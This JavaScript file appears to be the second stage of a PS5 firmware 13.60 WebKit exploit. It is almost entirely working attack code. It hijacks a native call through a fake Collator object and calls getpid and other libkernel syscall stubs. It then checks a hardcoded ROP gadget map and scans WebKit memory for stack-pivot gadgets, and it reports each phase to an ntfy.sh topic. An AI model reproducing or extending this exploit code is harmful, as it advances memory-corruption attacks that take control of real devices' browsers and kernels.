(function(){
  "use strict";

  var meta=window.__PS5_STAGEB_META||{};
  var rid=String(meta.rid||"unknown");
  var TOPIC=String(meta.topic||"");
  var ctx=window.__PS5_CTX;

  function relay(title,msg){
    if(!TOPIC) return;
    var base="https://ntfy.sh/"+encodeURIComponent(TOPIC);
    var u=base+"/publish?title="+encodeURIComponent(title)+
      "&message="+encodeURIComponent(msg)+"&tags=computer&_="+Date.now();

    try{
      if(navigator.sendBeacon)
        navigator.sendBeacon(
          base+"?title="+encodeURIComponent(title)+"&tags=computer&_="+Date.now(),
          String(msg)
        );
    }catch(_){}

    try{
      fetch(u,{method:"GET",mode:"no-cors",cache:"no-store",keepalive:true})
        .catch(function(){});
    }catch(_){}

    try{
      if(!window.__stageBImgs) window.__stageBImgs=[];
      var im=new Image();
      window.__stageBImgs.push(im);
      im.src=u;
    }catch(_){}
  }

  function report(phase,extra){
    var msg="advanced_stage=B\nrun="+rid+"\nfirmware=13.60\nphase="+phase+
      (extra?"\n"+extra:"");
    try{localStorage.setItem("ps5-1360-last-stageb",msg);}catch(_){}
    relay("PS5 13.60 ADV-B "+rid,msg);
  }

  function low48Bytes(value){
    var out=[];
    var v=Number(value);
    var hi=Math.floor(v/0x100000000);
    var lo=v-hi*0x100000000;
    out.push(lo&0xff);
    out.push(Math.floor(lo/0x100)&0xff);
    out.push(Math.floor(lo/0x10000)&0xff);
    out.push(Math.floor(lo/0x1000000)&0xff);
    out.push(hi&0xff);
    out.push(Math.floor(hi/0x100)&0xff);
    return out;
  }

  function writeQwordToArena(off,value){
    var A=ctx.arena;
    var v=Number(value);
    var hi=Math.floor(v/0x100000000);
    var lo=v-hi*0x100000000;
    A[off+0]=lo&0xff;
    A[off+1]=Math.floor(lo/0x100)&0xff;
    A[off+2]=Math.floor(lo/0x10000)&0xff;
    A[off+3]=Math.floor(lo/0x1000000)&0xff;
    A[off+4]=hi&0xff;
    A[off+5]=Math.floor(hi/0x100)&0xff;
    A[off+6]=0;
    A[off+7]=0;
  }

  if(!ctx){
    report("DIRECT_GETPID_ABORT","reason=no-ps5-ctx");
    return;
  }

  var target=0;
  try{
    target=ctx.kernelBaseCandidates && ctx.kernelBaseCandidates.getpidPtr
      ? Number(ctx.kernelBaseCandidates.getpidPtr) : 0;
  }catch(_){target=0;}

  report("DIRECT_GETPID_START",
    "ctx=1\ngetpidPtr="+String(target)+
    "\nwebkitBase="+String(ctx.webkitBase||0)+
    "\nlibkernelBase="+String(ctx.libkernelBase||0));

  if(!(target>0x800000000 && target<0x900000000)){
    report("DIRECT_GETPID_FAIL","reason=invalid-getpid-pointer\ngetpidPtr="+String(target));
    return;
  }

  if(!ctx.arena || typeof ctx.aim!=="function" || typeof ctx.compare!=="function"
     || !ctx.collatorSaved || !ctx.collatorCell || !ctx.fakeCollator){
    report("DIRECT_GETPID_FAIL","reason=incomplete-handoff-context");
    return;
  }

  var field=null;
  try{
    // Same natural native-call layout already proven by the Userland
    // notification: rdi=0, rcx=0, callee=getpid.
    writeQwordToArena(0x100+0x48,0);
    writeQwordToArena(0x100+0x60,0);
    writeQwordToArena(0x100+0xE0,target);

    field=ctx.aim(Number(ctx.collatorCell)+0x18);
    var fp=low48Bytes(ctx.fakeCollator);
    for(var i=0;i<6;i++) field[i]=fp[i];
    field[6]=0; field[7]=0;

    var result;
    try{
      result=ctx.compare("");
    }finally{
      var restore=ctx.aim(Number(ctx.collatorCell)+0x18);
      for(var j=0;j<ctx.collatorSaved.length;j++)
        restore[j]=ctx.collatorSaved[j];
    }

    var n=Number(result);
    if(Number.isFinite(n) && Math.floor(n)===n && n>0 && n<1000000){
      report("DIRECT_GETPID_PASS",
        "pid="+String(n)+"\ngetpidPtr="+String(target)+"\nmode=NATURAL_NATIVE_CALL");
      var st=document.getElementById("status");
      if(st) st.textContent="DIRECT GETPID PASS — pid="+String(n)+" — running safe capability census…";

      // Stage C: only no-argument, side-effect-free libkernel syscall wrappers.
      // RVA values come from X1NON's PS5 13.60 syscallStubs table.
      var SAFE_STUBS=[
        {name:"getppid", num:39,  rva:0x1b760},
        {name:"getuid",  num:24,  rva:0x1c9b0},
        {name:"geteuid", num:25,  rva:0x1bd20},
        {name:"getegid", num:43,  rva:0x1d3c0},
        {name:"getgid",  num:47,  rva:0x1b1e0},
        {name:"is_in_sandbox", num:585, rva:0x1d040},
        {name:"sched_yield", num:331, rva:0x1bd80}
      ];

      function callNoArgStub(entry){
        var ptr=Number(ctx.libkernelBase||0)+entry.rva;
        if(!(ptr>0x800000000 && ptr<0x900000000))
          throw new Error("bad-stub-pointer-"+entry.name);

        writeQwordToArena(0x100+0x48,0);
        writeQwordToArena(0x100+0x60,0);
        writeQwordToArena(0x100+0xE0,ptr);

        var f=ctx.aim(Number(ctx.collatorCell)+0x18);
        var b=low48Bytes(ctx.fakeCollator);
        for(var x=0;x<6;x++) f[x]=b[x];
        f[6]=0; f[7]=0;

        var rv;
        try{
          rv=ctx.compare("");
        }finally{
          var rr=ctx.aim(Number(ctx.collatorCell)+0x18);
          for(var y=0;y<ctx.collatorSaved.length;y++) rr[y]=ctx.collatorSaved[y];
        }
        return {name:entry.name,num:entry.num,rva:entry.rva,ptr:ptr,value:Number(rv)};
      }

      var results=[];
      var pos=0;

      // Stage D: read-only validation of the published X1NON 13.60 WebKit
      // gadget map, followed by a low-memory search for the two gadgets the
      // full bridge previously found by copying/scanning large chunks.
      var STATIC_GADGETS=[
        {name:"ret",rva:0x0000c7,bytes:[0xc3]},
        {name:"pop_rdi",rva:0x0288b2,bytes:[0x5f,0xc3]},
        {name:"pop_rsi",rva:0x01ee7a,bytes:[0x5e,0xc3]},
        {name:"pop_rdx",rva:0x0fa7a2,bytes:[0x5a,0xc3]},
        {name:"pop_rcx",rva:0x080597,bytes:[0x59,0xc3]},
        {name:"pop_rax",rva:0x03c98e,bytes:[0x58,0xc3]},
        {name:"pop_rsp",rva:0x0a1138,bytes:[0x5c,0xc3]},
        {name:"pop_r8",rva:0x08ce7c,bytes:[0x41,0x58,0xc3]},
        {name:"pop_r9",rva:0x080596,bytes:[0x41,0x59,0xc3]},
        {name:"store_rax",rva:0x03881f,bytes:[0x48,0x89,0x07,0xc3]},
        {name:"store_rsi",rva:0x0c05b6,bytes:[0x48,0x89,0x37,0xc3]}
      ];

      function bytesMatchAtRva(rva,pat){
        var v=ctx.aim(Number(ctx.webkitBase)+rva);
        for(var i=0;i<pat.length;i++){
          if((v[i]&0xff)!==pat[i]) return false;
        }
        return true;
      }

      function startLowMemoryPivotSaveScan(){
        var WEBKIT_TEXT_SIZE=0x2c7c000;
        var VIEW=0x100;
        var STEP=0xfd; // 3-byte overlap: enough for every 4-byte pattern.
        var off=0;
        var pivot=-1;
        var pivotKind="";
        var save=-1;
        var lastProgress=-1;

        function tick(){
          try{
            var windows=0;
            while(off<=WEBKIT_TEXT_SIZE-VIEW && windows<160){
              var v=ctx.aim(Number(ctx.webkitBase)+off);
              var lim=Math.min(VIEW,v.length)-4;

              for(var i=0;i<=lim;i++){
                var b0=v[i]&0xff;

                if(pivot<0){
                  if(b0===0x48 &&
                     (v[i+1]&0xff)===0x8b &&
                     (v[i+2]&0xff)===0xe7 &&
                     (v[i+3]&0xff)===0xc3){
                    pivot=off+i;
                    pivotKind="mov_rsp_rdi";
                  }else if(b0===0x57 &&
                           (v[i+1]&0xff)===0x5c &&
                           (v[i+2]&0xff)===0xc3){
                    pivot=off+i;
                    pivotKind="push_rdi_pop_rsp";
                  }
                }

                if(save<0 &&
                   b0===0x48 &&
                   (v[i+1]&0xff)===0x89 &&
                   (v[i+2]&0xff)===0x27 &&
                   (v[i+3]&0xff)===0xc3){
                  save=off+i;
                }

                if(pivot>=0 && save>=0) break;
              }

              if(pivot>=0 && save>=0) break;
              off+=STEP;
              windows++;
            }

            if(pivot>=0 && save>=0){
              var result=
                "pivot_rva=0x"+pivot.toString(16)+
                "\npivot_kind="+pivotKind+
                "\nsave_rva=0x"+save.toString(16)+
                "\nscan_mode=rwview-0x100-no-copy";
              try{localStorage.setItem("ps5-1360-gadget-discovery",result);}catch(_){}
              report("LOWMEM_PIVOT_SAVE_PASS",result);
              var sd=document.getElementById("status");
              if(sd) sd.textContent="STAGE D PASS — pivot 0x"+pivot.toString(16)+
                " · save 0x"+save.toString(16);
              return;
            }

            if(off>WEBKIT_TEXT_SIZE-VIEW){
              report("LOWMEM_PIVOT_SAVE_FAIL",
                "pivot="+(pivot>=0?"0x"+pivot.toString(16):"missing")+
                "\nsave="+(save>=0?"0x"+save.toString(16):"missing")+
                "\nscan_mode=rwview-0x100-no-copy");
              return;
            }

            var bucket=Math.floor(off/0x400000);
            if(bucket!==lastProgress){
              lastProgress=bucket;
              report("LOWMEM_SCAN_PROGRESS",
                "offset=0x"+off.toString(16)+
                "\npercent="+Math.min(100,Math.floor(off*100/WEBKIT_TEXT_SIZE)));
            }

            setTimeout(tick,0);
          }catch(e){
            report("LOWMEM_PIVOT_SAVE_FAIL",
              "reason=exception\noffset=0x"+off.toString(16)+
              "\nerror="+String(e&&e.message||e).slice(0,180));
          }
        }

        report("LOWMEM_PIVOT_SAVE_START",
          "text_size=0x"+WEBKIT_TEXT_SIZE.toString(16)+
          "\nview=0x100\nstep=0xfd\ncopy_buffers=0");
        setTimeout(tick,250);
      }

      function startStageD(){
        var verified=[];
        var failed=[];

        try{
          for(var gi=0;gi<STATIC_GADGETS.length;gi++){
            var g=STATIC_GADGETS[gi];
            var ok=bytesMatchAtRva(g.rva,g.bytes);
            (ok?verified:failed).push(g.name+"@0x"+g.rva.toString(16));
            report("STATIC_GADGET_VERIFY",
              "name="+g.name+
              "\nrva=0x"+g.rva.toString(16)+
              "\nmatch="+(ok?"1":"0"));
          }
        }catch(e){
          report("STATIC_GADGET_MAP_FAIL",
            "reason=exception\nerror="+String(e&&e.message||e).slice(0,180));
          return;
        }

        if(failed.length){
          report("STATIC_GADGET_MAP_FAIL",
            "verified="+verified.length+
            "\nfailed="+failed.join(","));
          return;
        }

        report("STATIC_GADGET_MAP_PASS",
          "verified="+verified.length+
          "\ngadgets="+verified.join(",")+
          "\nsource=X1NON-13.60");
        var sd0=document.getElementById("status");
        if(sd0) sd0.textContent="STATIC GADGET MAP PASS — searching pivot/save read-only…";
        setTimeout(startLowMemoryPivotSaveScan,400);
      }

      function nextSafeProbe(){
        if(pos>=SAFE_STUBS.length){
          var parts=[];
          for(var z=0;z<results.length;z++)
            parts.push(results[z].name+"="+String(results[z].value));

          var sandbox=results.filter(function(x){return x.name==="is_in_sandbox";})[0];
          report("CAPABILITY_CENSUS_PASS",
            "pid="+String(n)+
            "\n"+parts.join("\n")+
            "\nsandbox_value="+String(sandbox?sandbox.value:"unknown")+
            "\nmode=NATURAL_NATIVE_CALL");

          var st3=document.getElementById("status");
          if(st3) st3.textContent="STAGE C PASS — "+parts.join(" · ")+" — validating static gadgets…";
          setTimeout(startStageD,450);
          return;
        }

        var ent=SAFE_STUBS[pos++];
        try{
          var r=callNoArgStub(ent);
          results.push(r);
          report("CAPABILITY_PROBE",
            "name="+r.name+"\nnum="+r.num+"\nrva=0x"+r.rva.toString(16)+
            "\nvalue="+String(r.value));
        }catch(e){
          results.push({name:ent.name,num:ent.num,rva:ent.rva,value:"EX"});
          report("CAPABILITY_PROBE_FAIL",
            "name="+ent.name+"\nnum="+ent.num+
            "\nerror="+String(e&&e.message||e).slice(0,180));
        }

        setTimeout(nextSafeProbe,180);
      }

      setTimeout(nextSafeProbe,350);
    }else{
      report("DIRECT_GETPID_FAIL",
        "reason=unexpected-return\nreturn="+String(result)+
        "\ngetpidPtr="+String(target));
    }
  }catch(e){
    try{
      if(field && ctx.collatorSaved){
        var r=ctx.aim(Number(ctx.collatorCell)+0x18);
        for(var k=0;k<ctx.collatorSaved.length;k++) r[k]=ctx.collatorSaved[k];
      }
    }catch(_){}

    report("DIRECT_GETPID_FAIL",
      "reason=exception\nerror="+String(e&&e.message||e).slice(0,220)+
      "\ngetpidPtr="+String(target));
  }
}());
